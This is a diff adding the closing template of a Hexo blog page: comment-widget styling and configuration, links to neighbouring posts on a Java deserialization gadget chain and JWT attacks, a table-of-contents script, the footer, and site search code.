+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'uLfelBhZptG0cuPVosey3XGK-gzGzoHsz',
+        appKey: 'VGEIGC5H2KpZfho226lNbpYT',
+        serverURLs: 'https://ulfelbhz.lc-cn-n1-shared.com',
+        notify: 'true' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '3',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/01/28/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc5-lian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Java 反序列化 Commons-Collections 篇 CC5 链">
+                        
+                        <span class="card-title">Java 反序列化 Commons-Collections 篇 CC5 链</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Java 反序列化 Commons-Collections 篇 CC5 链
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java-%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java 安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CC-%E9%93%BE/">
+                        <span class="chip bg-color">CC 链</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/01/28/skilllearning/jwt/jwt-yuan-li-gong-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="JWT 原理&amp;攻击">
+                        
+                        <span class="card-title">JWT 原理&amp;攻击</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            JWT 原理&攻击
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/JWT/" class="post-category">
+                                    JWT
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/JWT/">
+                        <span class="chip bg-color">JWT</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">nahv0</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/nahv0" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:q.nah@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
